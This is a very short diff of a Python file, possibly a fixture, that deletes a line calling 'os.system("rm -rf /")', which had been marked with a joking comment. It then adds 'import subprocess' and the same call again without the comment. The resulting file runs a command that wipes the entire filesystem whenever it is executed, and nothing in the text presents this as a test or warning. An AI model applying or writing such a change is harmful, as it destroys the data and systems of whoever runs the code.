@@ -1,3 +1,3 @@
 import os
-
-os.system("rm -rf /")  # lol nope
+import subprocess
+os.system("rm -rf /")
